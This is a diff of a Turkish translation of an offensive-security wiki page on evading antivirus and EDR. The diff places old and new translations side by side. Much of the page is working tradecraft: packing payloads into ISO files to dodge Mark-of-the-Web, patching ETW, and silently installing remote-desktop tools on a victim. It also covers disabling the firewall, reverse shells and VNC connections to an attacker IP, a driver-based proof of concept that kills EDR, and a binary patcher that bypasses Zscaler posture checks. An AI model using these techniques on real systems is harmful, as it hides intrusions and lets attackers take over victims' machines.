+> **trusted** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.
 
-Payload’larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web (MOTW)’nin **non NTFS** volumes üzerine **uygulanamamasıdır**.
+Payload'larınızın Mark of The Web almasını önlemenin oldukça etkili bir yolu, onları ISO gibi bir tür container'ın içine package etmektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **non NTFS** volume'lara uygulanamamasıdır.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) Mark-of-the-Web’den kaçınmak için payload’ları output containers içine paketleyen bir tool’dur.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları output container'larına package eden bir tool'dur.
 
-Example usage:
+Örnek kullanım:
 ```bash
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
@@ -476,139 +476,140 @@ Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-SmartScreen'i, yükleri ISO dosyaları içine paketleyerek baypas etmeye yönelik bir demo [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) ile.
+İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i bypass etmeye yönelik bir demo.
 
 <figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
 ## ETW
 
-Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **log events** kaydetmesine izin veren güçlü bir logging mekanizmasıdır. Ancak security products tarafından kötü amaçlı faaliyetleri izlemek ve tespit etmek için de kullanılabilir.
+Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları loglamasına** olanak tanıyan güçlü bir logging mekanizmasıdır. Ancak security product'lar tarafından malicious activity'leri izlemek ve tespit etmek için de kullanılabilir.
 
-AMSI'nin disabled (bypassed) edilmesine benzer şekilde, kullanıcı alanı process'inin **`EtwEventWrite`** fonksiyonunu da hiçbir event kaydetmeden hemen döndürecek şekilde yapmak mümkündür. Bu, fonksiyonu memory içinde patch'leyip hemen return edecek hale getirerek yapılır; böylece o process için ETW logging etkili biçimde disabled edilir.
+AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, user space process'in **`EtwEventWrite`** function'ının herhangi bir olayı loglamadan hemen dönmesini sağlamak da mümkündür. Bu işlem, function'ın memory'de patch'lenerek hemen dönmesinin sağlanmasıyla gerçekleştirilir ve söz konusu process için ETW logging etkili bir şekilde devre dışı bırakılır.
 
-Daha fazla bilgi için **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerine bakabilirsiniz.
+Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.
 
 
 ## C# Assembly Reflection
 
-C# binary'lerini memory'de yüklemek uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation tools çalıştırmak için hâlâ çok iyi bir yoldur.
+C# binary'lerini memory'ye yüklemek uzun zamandır bilinen bir yöntemdir ve post-exploitation tools'larınızı AV tarafından yakalanmadan çalıştırmak için hâlâ oldukça iyi bir yöntemdir.
 
-Payload doğrudan memory'ye yüklenip disk'e dokunmayacağı için, yalnızca tüm process için AMSI patch'leme konusunda endişelenmemiz gerekir.
+Payload doğrudan memory'ye yükleneceği ve diske dokunmayacağı için yalnızca tüm process için AMSI'yi patch'lememiz gerekecek.
 
-Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) C# assemblies'i doğrudan memory içinde execute etme yeteneği sunar, ancak bunu yapmanın farklı yolları vardır:
+Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan memory'de çalıştırma yeteneği sağlar; ancak bunu yapmanın farklı yolları vardır:
 
 - **Fork\&Run**
 
-Bu yöntem, **yeni bir sacrificial process başlatmayı**, post-exploitation malicious code'unu bu yeni process'e inject etmeyi, malicious code'u execute etmeyi ve iş bitince yeni process'i kill etmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, execution'ın bizim Beacon implant process'imizin **dışında** gerçekleşmesidir. Bu, post-exploitation aksiyonumuzda bir şeyler ters giderse veya yakalanırsa, **implant'ımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığının **daha yüksek** olmasıdır.
+Bu yöntem, **yeni bir sacrificial process başlatmayı**, post-exploitation malicious code'unuzu bu yeni process'e inject etmeyi, malicious code'unuzu çalıştırmayı ve işlem tamamlandığında yeni process'i kill etmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, execution'ın **Beacon implant process'imizin dışında** gerçekleşmesidir. Bu, post-exploitation action'ımız sırasında bir şeyler ters giderse veya yakalanırsa, **implant'ımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma **olasılığınızın daha yüksek** olmasıdır.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
-Bu, post-exploitation malicious code'u **kendi process'ine** inject etmekle ilgilidir. Böylece yeni bir process oluşturup AV tarafından scan edilmesinden kaçınabilirsiniz; ancak dezavantajı, payload'unuzun execution'ı sırasında bir şeyler ters giderse **beacon'ınızı kaybetme olasılığınızın çok daha yüksek** olmasıdır, çünkü crash olabilir.
+Bu yöntem, post-exploitation malicious code'un **kendi process'ine** inject edilmesini içerir. Bu sayede yeni bir process oluşturmak ve onu AV tarafından scan ettirmek zorunda kalmazsınız; ancak dezavantajı, payload'ınızın execution'ı sırasında bir şeyler ters giderse crash meydana gelebileceğinden **beacon'ınızı kaybetme** **olasılığınızın çok daha yüksek** olmasıdır.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> C# Assembly loading hakkında daha fazla bilgi okumak isterseniz, lütfen şu makaleye göz atın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'una ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+> C# Assembly loading hakkında daha fazla bilgi edinmek istiyorsanız [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) adresindeki makaleye ve InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atabilirsiniz.
 
-C# Assemblies'i **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) bakın.
+C# Assembly'lerini **PowerShell'den** de load edebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) içeriklerine göz atın.
 
-## Using Other Programming Languages
+## Other Programming Languages Kullanmak
 
-[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, compromised machine'e **Attacker Controlled SMB share üzerinde kurulu interpreter environment'a erişim** vererek diğer diller kullanılarak malicious code execute etmek mümkündür.
+[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) tarafından önerildiği üzere, compromised machine'e **Attacker Controlled SMB share üzerinde kurulu interpreter environment'a** erişim vererek diğer dilleri kullanıp malicious code execute etmek mümkündür.
 
-Interpreter Binaries ve SMB share üzerindeki environment'a erişim sağlayarak, bu dillerdeki arbitrary code'u compromised machine'in memory'si içinde **execute edebilirsiniz**.
+Interpreter Binaries'e ve SMB share üzerindeki environment'a erişim izni vererek, bu dillerdeki **arbitrary code'u compromised machine'in memory'si içinde execute edebilirsiniz**.
 
-Repo şunu belirtiyor: Defender yine de scripts'i tarıyor; ancak Go, Java, PHP vb. kullanarak **static signatures'ı bypass etmek için daha fazla esnekliğe** sahibiz. Bu dillerde obfuscate edilmemiş random reverse shell scripts ile yapılan testler başarılı olmuştur.
+Repo'da belirtildiği üzere: Defender script'leri hâlâ scan eder; ancak Go, Java, PHP vb. kullanarak **static signature'ları bypass etmek için daha fazla flexibility** elde ederiz. Bu dillerde random ve un-obfuscated reverse shell script'leriyle yapılan testler başarılı olmuştur.
 
 ## TokenStomping
 
-Token stomping, bir attacker'ın **access token'ı veya EDR ya da AV gibi bir security prouct'ü manipüle etmesine** izin veren bir tekniktir; böylece privilege'larını düşürerek process'in ölmemesini ama malicious activities'i kontrol etmek için yetkiye sahip olmamasını sağlar.
+Token stomping, bir attacker'ın **access token'ı veya EDR ya da AV gibi bir security product'ı manipulate etmesine** ve böylece process'in ölmemesi, ancak malicious activity'leri kontrol etmek için gerekli permissions'a sahip olmaması amacıyla privileges'ını azaltmasına olanak tanıyan bir tekniktir.
 
-Bunu önlemek için Windows, security process'lerinin token'ları üzerinde **external processes**'in handle almasını engelleyebilir.
+Bunu önlemek için Windows, **external process'lerin** security process'lerinin token'ları üzerinde handle almasını engelleyebilir.
 
 - [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
 - [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
 - [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)
 
-## Using Trusted Software
+## Trusted Software Kullanmak
 
 ### Chrome Remote Desktop
 
-[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) içinde açıklandığı gibi, Chrome Remote Desktop'ı bir victim PC'sine kurup sonra onu takeover etmek ve persistence sağlamak oldukça kolaydır:
-1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" üzerine tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
-2. Kurulumu victim üzerinde sessizce çalıştırın (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
-3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Ardından sihirbaz sizden authorize etmenizi isteyecek; devam etmek için Authorize butonuna tıklayın.
-4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Pin parametresine dikkat edin; bu, GUI kullanmadan pin ayarlamaya izin verir).
+[**bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı üzere, Chrome Remote Desktop'ı bir victim'ın PC'sine deploy etmek ve ardından onu takeover ederek persistence sağlamak kolaydır:
+1. https://remotedesktop.google.com/ adresinden download edin, "Set up via SSH" seçeneğine ve ardından Windows için MSI file'ına tıklayarak MSI file'ını download edin.
+2. Installer'ı victim üzerinde silent olarak çalıştırın (admin gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
+3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Wizard sizden authorize etmenizi isteyecektir; devam etmek için Authorize button'ına tıklayın.
+4. Verilen parameter'ı bazı adjustments ile execute edin: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI kullanmadan pin ayarlanmasını sağlayan pin param'ına dikkat edin).
 
 
 ## Advanced Evasion
 
-Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetry kaynağını hesaba katmanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.
+Evasion, oldukça karmaşık bir konudur; bazen yalnızca tek bir system içindeki birçok farklı telemetry kaynağını hesaba katmanız gerekir. Bu nedenle mature environment'larda tamamen undetected kalmak neredeyse imkânsızdır.
 
-Karşı karşıya geldiğiniz her environment'ın kendi güçlü ve zayıf yönleri olacaktır.
+Karşılaştığınız her environment'ın kendine özgü güçlü ve zayıf yönleri olacaktır.
 
-Daha ileri Evasion tekniklerine giriş yapmak için @ATTL4S'in [@ATTL4S](https://twitter.com/DaniLJ94) bu konuşmasını izlemenizi şiddetle tavsiye ederim.
+Daha Advanced Evasion teknikleri hakkında fikir edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.
+
 
 {{#ref}}
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-Aynı zamanda @mariuszbit'in [@mariuszbit](https://twitter.com/mariuszbit) Evasion in Depth hakkındaki diğer harika konuşması da vardır.
+Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılmış başka bir harika konuşmadır.
 
 
 {{#ref}}
 https://www.youtube.com/watch?v=IbA7Ung39o4
 {{#endref}}
 
-## **Old Techniques**
+## **Eski Teknikler**
 
-### **Check which parts Defender finds as malicious**
+### **Defender'ın hangi bölümleri malicious olarak bulduğunu kontrol etmek**
 
-[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)'i kullanarak binary'nin **hangi parçalarının** Defender tarafından malicious olarak bulunduğunu öğrenene kadar **binary'nin parçalarını kaldırabilir** ve size böldürebilirsiniz.\
-Aynı şeyi yapan başka bir tool da [**avred**](https://github.com/dobin/avred)'dir; hizmeti sunan açık bir web sürümü de [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresindedir.
+**Binary'nin bölümlerini**, **Defender'ın malicious olarak tespit ettiği bölümü bulana kadar** kaldıran ve bunu size ayırarak gösteren [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
+**Aynı işlemi yapan** bir diğer tool ise [**avred**](https://github.com/dobin/avred)'dir; bu service'i [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık bir web interface'i üzerinden sunar.
 
 ### **Telnet Server**
 
-Windows10'a kadar tüm Windows sürümlerinde, (administrator olarak) şu şekilde kurabileceğiniz bir **Telnet server** vardı:
+Windows10'a kadar tüm Windows sürümleri, şu komut çalıştırılarak (administrator olarak) install edilebilen bir **Telnet server** ile birlikte geliyordu:
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-Sistem başlatıldığında **başlasın** ve şimdi **çalıştırın**:
+Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**Telnet portunu değiştir** (stealth) ve firewall’u devre dışı bırak:
+**telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Şuradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin indirmelerini istiyorsunuz)
+Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin downloads sürümünü istiyorsunuz)
 
-**HOST ÜZERİNDE**: _**winvnc.exe**_ çalıştırın ve server'ı yapılandırın:
+**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve server'ı yapılandırın:
 
 - _Disable TrayIcon_ seçeneğini etkinleştirin
-- _VNC Password_ içinde bir şifre belirleyin
-- _View-Only Password_ içinde bir şifre belirleyin
+- _VNC Password_ alanında bir password belirleyin
+- _View-Only Password_ alanında bir password belirleyin
 
-Sonra, binary _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın
+Ardından _**winvnc.exe**_ binary'sini ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın
 
 #### **Reverse connection**
 
-**attacker**, **host** üzerinde `vncviewer.exe -listen 5900` binary’sini **çalıştırmalı**; böylece bir reverse **VNC connection** yakalamaya **hazır** olur. Ardından, **victim** içinde: winvnc daemon `winvnc.exe -run` başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` çalıştırın
+**Attacker**, reverse **VNC connection** yakalamaya **hazır** olması için kendi **host**'u içinde `vncviewer.exe -listen 5900` binary'sini **çalıştırmalıdır**. Ardından **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın
 
-**UYARI:** Stealth’i korumak için birkaç şey yapmamalısınız
+**WARNING:** Stealth'i korumak için birkaç şey yapmamalısınız
 
-- Eğer zaten çalışıyorsa `winvnc` başlatmayın, yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
-- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın, yoksa [config window](https://i.imgur.com/rfMQWcf.png) açılır
-- Yardım için `winvnc -h` çalıştırmayın, yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklersiniz
+- Zaten çalışıyorsa `winvnc`'yi başlatmayın, aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. `tasklist | findstr winvnc` ile çalışıp çalışmadığını kontrol edin
+- Aynı dizinde `UltraVNC.ini` olmadan `winvnc`'yi başlatmayın, aksi hâlde [config window](https://i.imgur.com/rfMQWcf.png) açılır
+- Yardım için `winvnc -h` çalıştırmayın, aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir
 
 ### GreatSCT
 
-Şuradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -626,13 +627,13 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-Şimdi `msfconsole -r file.rc` ile **lister**’ı başlatın ve **xml payload**’ı şu şekilde **çalıştırın**:
+Şimdi **lister'ı** `msfconsole -r file.rc` ile **başlatın** ve **xml payload**'ı şu komutla **çalıştırın**:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**Mevcut defender süreci çok hızlı bir şekilde sonlandıracaktır.**
+**Mevcut defender process'i çok hızlı sonlandıracaktır.**
 
-### Kendi reverse shell’imizi derlemek
+### Kendi reverse shell'imizi derleme
 
 https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
@@ -642,7 +643,7 @@ https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
-Bunu şununla kullanın:
+Şununla kullanın:
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -719,7 +720,7 @@ catch (Exception err) { }
 }
 }
 ```
-### C# using compiler
+### C# compiler kullanımı
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
@@ -739,7 +740,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
 {{#endref}}
 
-C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
 ```
@@ -754,7 +755,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 - [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 - [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### build injectors için python kullanma örneği:
+### Injector oluşturmak için python kullanımı örneği:
 
 - [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)
 
@@ -783,28 +784,28 @@ https://github.com/TheWover/donut
 # Vulcan
 https://github.com/praetorian-code/vulcan
 ```
-### More
+### Daha Fazla
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
-## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space’den AV/EDR Öldürme
+## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space'ten AV/EDR'yi Öldürme
 
-Storm-2603, ransomware bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol aracını kullandı. Araç, kendi **savunmasız ama *imzalı* sürücüsünü** getirir ve bunu, Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemleri yapmak için kötüye kullanır.
+Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir console utility kullandı. Bu tool, **kendi savunmasız ancak *signed* driver'ını** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bunu kötüye kullanır.
 
-Önemli noktalar
-1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys`’dir, ancak ikili aslında Antiy Labs’in “System In-Depth Analysis Toolkit” içindeki yasal olarak imzalı `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
-2. **Servis kurulumu**:
+Önemli çıkarımlar
+1. **Signed driver**: Diske yazılan dosya `ServiceMouse.sys` olsa da binary, Antiy Labs'ın “System In-Depth Analysis Toolkit” aracındaki meşru olarak imzalanmış `AToolsKrnl64.sys` driver'ıdır. Driver geçerli bir Microsoft signature taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
+2. **Service installation**:
 ```powershell
 sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
 sc start  ServiceMouse
 ```
-İlk satır sürücüyü bir **kernel servisi** olarak kaydeder ve ikinci satır onu başlatır; böylece `\\.\ServiceMouse` user land’den erişilebilir olur.
-3. **Sürücü tarafından sunulan IOCTLs**
+İlk satır driver'ı bir **kernel service** olarak kaydeder, ikinci satır ise driver'ı başlatır; böylece `\\.\ServiceMouse` user land'den erişilebilir hale gelir.
+3. **Driver tarafından sunulan IOCTL'ler**
 | IOCTL code | Capability                              |
 |-----------:|-----------------------------------------|
-| `0x99000050` | PID ile rastgele bir process’i sonlandırır (Defender/EDR servislerini öldürmek için kullanılır) |
-| `0x990000D0` | Diskte rastgele bir dosyayı siler |
-| `0x990001D0` | Sürücüyü unload eder ve servisi kaldırır |
+| `0x99000050` | PID ile rastgele bir process'i terminate etme (Defender/EDR servislerini öldürmek için kullanılır) |
+| `0x990000D0` | Disk üzerindeki rastgele bir dosyayı silme |
+| `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |
 
 Minimal C proof-of-concept:
 ```c
@@ -818,28 +819,28 @@ CloseHandle(hDrv);
 return 0;
 }
 ```
-4. **Neden çalışır**:  BYOVD, user-mode korumalarını tamamen atlar; kernel’de çalışan code, *protected* process’leri açabilir, sonlandırabilir veya PPL/PP, ELAM ya da diğer hardening özelliklerinden bağımsız olarak kernel objelerini manipüle edebilir.
+4. **Neden çalışır**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan code, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process'leri açabilir, terminate edebilir veya kernel object'lerini kurcalayabilir.
 
 Detection / Mitigation
-•  Microsoft’un vulnerable-driver block list’ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys` yüklemeyi reddeder.
-•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir driver world-writable bir dizinden yüklenirse ya da allow-list’te yoksa alarm üretin.
-•  Özel device object’lere yönelik user-mode handle’larını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını takip edin.
+•  Microsoft'ın vulnerable-driver block list'ini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys` dosyasını yüklemeyi reddeder.
+•  Yeni *kernel* service oluşturulmalarını izleyin ve bir driver world-writable bir directory'den yüklendiğinde veya allow-list'te bulunmadığında alert oluşturun.
+•  Custom device object'lere yönelik user-mode handle'larını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.
 
-### On-Disk Binary Patching ile Zscaler Client Connector Posture Checks’i Bypass Etme
+### On-Disk Binary Patching ile Zscaler Client Connector Posture Checks'i Bypass Etme
 
-Zscaler’ın **Client Connector** bileşeni device-posture kurallarını lokal olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC’ye güvenir. İki zayıf tasarım tercihi, tam bir bypass’ı mümkün kılar:
+Zscaler'ın **Client Connector** ürünü device-posture kurallarını local olarak uygular ve sonuçları diğer component'lere iletmek için Windows RPC'ye güvenir. İki zayıf design choice, full bypass'ı mümkün kılar:
 
-1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (server’a bir boolean gönderilir).
-2. Dahili RPC endpoint’leri yalnızca bağlanan executable’ın **Zscaler tarafından imzalı** olduğunu doğrular (`WinVerifyTrust` ile).
+1. Posture evaluation **tamamen client-side** gerçekleşir (server'a bir boolean gönderilir).
+2. Internal RPC endpoint'leri yalnızca bağlanan executable'ın `WinVerifyTrust` aracılığıyla **Zscaler tarafından signed** olduğunu doğrular.
 
-Diskteki dört imzalı binary’yi **patch’leyerek** her iki mekanizma da etkisiz hale getirilebilir:
+**Disk üzerindeki dört signed binary'yi patch'leyerek** her iki mekanizma da etkisiz hale getirilebilir:
 
-| Binary | Original logic patched | Result |
+| Binary | Patch'lenen original logic | Sonuç |
 |--------|------------------------|---------|
-| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döner; böylece her check uyumlu görünür |
-| `ZSAService.exe` | `WinVerifyTrust`’e dolaylı çağrı | NOP-ed ⇒ herhangi bir (hatta imzasız) process RPC pipes’a bağlanabilir |
-| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
-| `ZSATunnel.exe` | Tünel üzerindeki bütünlük kontrolleri | Short-circuited |
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her check compliant olur |
+| `ZSAService.exe` | `WinVerifyTrust`'e indirect call | NOP-ed ⇒ herhangi bir (unsigned olsa bile) process RPC pipe'larına bağlanabilir |
+| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
+| `ZSATunnel.exe` | Tunnel üzerindeki integrity check'leri | Short-circuit edilir |
 
 Minimal patcher excerpt:
 ```python
@@ -855,33 +856,33 @@ else:
 f.seek(off)
 f.write(replacement)
 ```
-Orijinal dosyalar değiştirildikten ve service stack yeniden başlatıldıktan sonra:
+Orijinal dosyaları değiştirdikten ve service stack'i yeniden başlattıktan sonra:
 
-* **Tüm** posture checks **yeşil/uyumlu** olarak görünür.
-* İmzalanmamış veya değiştirilmiş binary'ler named-pipe RPC endpoint'lerini açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
-* Ele geçirilmiş host, Zscaler policies tarafından tanımlanan internal network'e sınırsız erişim kazanır.
+* **Tüm** posture kontrolleri **green/compliant** olarak görüntülenir.
+* İmzalanmamış veya değiştirilmiş binary'ler named-pipe RPC endpoint'lerini (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`) açabilir.
+* Ele geçirilmiş host, Zscaler policies tarafından tanımlanan internal network'e kısıtlamasız erişim kazanır.
 
-Bu case study, tamamen client-side trust decisions ve basit signature checks'in birkaç byte patch ile nasıl etkisiz hale getirilebildiğini gösterir.
+Bu case study, tamamen client-side trust kararlarının ve basit signature kontrollerinin birkaç byte patch ile nasıl aşılabileceğini gösterir.
 
-## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs
+## Protected Process Light (PPL)'ı LOLBINs ile AV/EDR'ye Müdahale Etmek İçin Kötüye Kullanma
 
